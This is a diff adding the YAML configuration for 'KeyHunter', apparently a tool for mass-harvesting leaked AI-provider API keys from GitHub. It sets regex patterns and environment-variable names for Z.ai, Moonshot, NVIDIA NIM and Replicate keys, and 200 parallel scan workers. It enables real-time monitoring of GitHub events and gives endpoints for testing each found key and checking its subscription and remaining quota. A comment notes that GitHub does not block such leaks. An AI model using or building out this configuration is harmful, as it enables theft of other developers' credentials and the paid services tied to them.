@@ -1,0 +1,91 @@
+# KeyHunter Configuration
+
+# GitHub token (получить: https://github.com/settings/tokens)
+github_token: ""  # Вставить токен или использовать gh auth
+
+# Интервал сканирования (секунды)
+scan_interval: 300  # 5 минут между циклами
+
+# Workers для параллельного сканирования
+scan_workers: 200
+validate_workers: 50
+
+# GitHub search rate limit (запросов в минуту)
+# Free: 10/min, Pro: 30/min
+search_delay: 2  # секунды между запросами
+
+# Провайдеры (true = включить)
+providers:
+  zai:
+    enabled: true
+    name: "Z.ai (ZhipuAI)"
+    vars: ["ZHIPU_API_KEY", "Z_AI_API_KEY", "BIGMODEL_API_KEY",
+           "ZHIPUAI_API_KEY", "ZAI_API_KEY", "GLM_API_KEY"]
+    pattern: '[a-f0-9]{32}\.[A-Za-z0-9]{10,30}'
+    test_url: "https://api.z.ai/api/coding/paas/v4/chat/completions"
+    test_model: "glm-5.2"
+    test_type: "zai_coding"
+    subscription_url: "https://api.z.ai/api/biz/subscription/list"
+    quota_url: "https://api.z.ai/api/monitor/usage/quota/limit"
+    github_blocks: false  # GitHub НЕ блокирует утечки
+
+  moonshot:
+    enabled: true
+    name: "Moonshot (Kimi)"
+    vars: ["MOONSHOT_API_KEY", "KIMI_API_KEY"]
+    pattern: 'sk-[A-Za-z0-9]{20,100}'
+    test_url: "https://api.moonshot.cn/v1/chat/completions"
+    test_model: "moonshot-v1-8k"
+    test_type: "standard"
+    github_blocks: false
+
+  nvidia:
+    enabled: true
+    name: "NVIDIA NIM"
+    vars: ["NVIDIA_API_KEY", "NIM_API_KEY"]
+    pattern: 'nvapi-[A-Za-z0-9_-]{30,100}'
+    test_url: "https://integrate.api.nvidia.com/v1/chat/completions"
+    test_model: "meta/llama-3.3-70b-instruct"
+    test_type: "standard"
+    github_blocks: false
+
+  replicate:
+    enabled: false
+    name: "Replicate"
+    vars: ["REPLICATE_API_TOKEN"]
+    pattern: 'r8_[A-Za-z0-9]{30,100}'
+    test_url: "https://api.replicate.com/v1/account"
+    test_model: null
+    test_type: "replicate"
+    github_blocks: false
+
+# Расширения файлов для поиска
+extensions:
+  - env
+  - env.local
+  - env.production
+  - env.example
+  - env.dev
+  - py
+  - js
+  - ts
+  - ipynb
+  - json
+  - yaml
+  - yml
+  - sh
+  - bat
+  - go
+  - rs
+  - java
+  - rb
+  - md
+  - txt
+  - toml
+  - ini
+  - cfg
+
+# Real-time мониторинг (GitHub Events API)
+realtime:
+  enabled: true
+  poll_interval: 60  # секунд
